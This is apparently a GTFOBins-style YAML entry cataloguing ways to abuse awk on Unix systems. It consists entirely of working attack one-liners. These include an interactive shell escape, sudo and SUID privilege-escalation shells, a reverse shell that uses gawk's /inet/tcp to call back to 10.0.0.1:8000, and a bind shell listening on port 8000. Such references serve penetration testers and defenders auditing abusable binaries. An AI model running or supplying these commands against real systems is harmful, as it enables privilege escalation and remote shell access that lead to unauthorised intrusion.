---
functions:
  exec-interactive:
    - code: awk 'BEGIN {system("/bin/sh")}'
  sudo-enabled:
    - code: sudo awk 'BEGIN {system("/bin/sh -p")}'
  suid-limited:
    - code: ./awk 'BEGIN {system("/bin/sh -p")}'
  reverse-shell-non-interactive:
    - description: Run `nc -l -p 8000` to receive the shell on the other end.
      code: |
        RHOST=10.0.0.1
        RPORT=8000
        awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
            s = "/inet/tcp/0/" RHOST "/" RPORT;
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
  bind-shell-non-interactive:
    - description: Run `nc 10.0.0.1 8000` to connect to the shell on the other end.
      code: |
        LPORT=8000
        awk -v LPORT=$LPORT 'BEGIN {
            s = "/inet/tcp/" LPORT "/0/0";
            while (1) {printf "> " |& s; if ((s |& getline c) <= 0) break;
            while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'
---
